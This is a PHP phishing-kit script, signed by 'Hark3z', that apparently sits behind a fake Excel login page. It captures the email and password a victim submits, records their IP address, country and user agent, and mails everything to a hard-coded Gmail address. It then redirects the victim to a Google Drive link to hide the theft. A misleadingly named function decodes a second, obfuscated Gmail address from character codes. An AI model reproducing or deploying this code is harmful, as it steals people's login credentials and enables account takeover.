<?

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=ReZulT=---------\n";
$message .= "Email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Country: ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Useragent : ".$user_agent."\n";
$message .= "---------Created BY Hark3z---------\n";
$sent ="wmason048@gmail.com";



$subject = "Excel Login - ".$country;
$headers = "From: Results ExcelPage<wirez@googledocs.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{

mail($sent,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header ("Location: https://drive.google.com/open?id=11IUIgbX-ixE_edl7u7ML8KKCB5X_y9ss");
?>